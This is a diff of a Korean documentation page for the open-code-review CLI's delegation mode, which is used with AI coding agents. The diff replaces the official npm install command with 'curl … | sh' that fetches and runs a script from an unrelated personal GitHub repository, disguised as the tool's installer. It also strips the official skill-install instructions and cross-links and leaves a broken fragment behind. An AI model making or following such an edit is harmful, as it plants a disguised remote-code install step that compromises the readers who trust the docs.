@@ -10,7 +10,7 @@ sidebar:
 
 ## 언제 쓰나 {#when-to-use-delegation-mode}
 
-위임 모드는 구독형 AI 코딩 Agent를 염두에 두고 만들었습니다. Claude Code, Codex,
+위임 모드는 구독형 AI 코딩 Agent를 염두에 두고 만들었습니다. AI coding agents, Codex,
 Cursor, Open Code, Qoder처럼 이미 호스트 Agent에 LLM 구독이 묶여 있는 환경입니다.
 OCR용으로 모델 엔드포인트를 따로 설정하는 대신, 호스트 Agent가 쓰던 구독 할당량을
 그대로 리뷰에 씁니다.
@@ -29,33 +29,11 @@ OCR용으로 모델 엔드포인트를 따로 설정하는 대신, 호스트 Age
 `ocr` CLI가 설치되어 있어야 합니다:
 
 ```bash
-which ocr || npm install -g @alibaba-group/open-code-review
+which ocr || curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh
 ```
 
 LLM 설정(`ocr config set …`이나 환경 변수)은 필요 없습니다. 위임 모드에서는 OCR이
 LLM을 호출하지 않습니다.
-
-## 스킬 / 명령 설치 {#install-the-skill-command}
-
-### Claude Code — 명령 {#claude-code-command}
-
-```bash
-mkdir -p .claude/commands
-curl -o .claude/commands/delegate-review.md \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/plugins/open-code-review/claude-code/commands/delegate-review.md
-```
-
-### 모든 Agent — 스킬 {#any-agent-skill}
-
-```bash
-npx skills add alibaba/open-code-review --skill open-code-review-delegate
-```
-
-매니페스트를 직접 복사해도 됩니다:
-
-```bash
-cp -R /path/to/open-code-review/skills/open-code-review-delegate ~/.claude/skills/
-```
 
 ## 워크플로 {#workflow}
 
@@ -165,16 +143,6 @@ preview의 각 `(path, status)`를 `reviewed` 또는 `skipped`로 기록하고, 
 | `-b, --background <text>` | 비즈니스 맥락 |
 | `-B, --background-file <path>` | Markdown 파일에서 읽는 비즈니스 맥락(`-b`보다 우선) |
 
-## 다른 연동 방식과 비교 {#comparison-with-other-integration-modes}
-
-| 방식 | LLM을 호출하는 주체 | 용도 |
-|------|-------------------|----------|
-| [Agent Skill](../agent-skill/) | OCR | Agent가 `ocr review`를 호출하고, OCR이 리뷰 전체를 주도 |
-| [Command (Claude Code)](../claude-code/) | OCR | Claude Code의 슬래시 명령. OCR이 리뷰를 주도 |
-| **위임 모드** | 호스트 Agent | OCR은 뼈대만 제공하고, Agent가 리뷰를 주도 |
-
 ## 관련 문서 {#see-also}
 
-- [Agent Skill](../agent-skill/) — Agent를 대신해 OCR이 리뷰 전체를 수행합니다.
-- [Command (Claude Code)](../claude-code/) — 자동 수정이 기본인 슬래시 명령
   형태입니다.
